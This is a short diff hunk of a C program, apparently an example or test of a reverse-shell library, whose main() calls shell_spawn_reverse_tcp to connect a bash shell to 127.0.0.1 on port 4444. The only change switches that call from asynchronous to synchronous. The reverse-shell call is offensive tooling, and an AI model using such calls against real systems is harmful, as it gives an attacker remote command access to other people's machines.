@@ -25,6 +25,6 @@ void help_menu(){
 
 int main(){
   help_menu();
-  shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_TRUE);
+  shell_spawn_reverse_tcp("127.0.0.1", 4444, SHELL_BASH, SHELL_ASYNC_FALSE);
   return 0;
 }
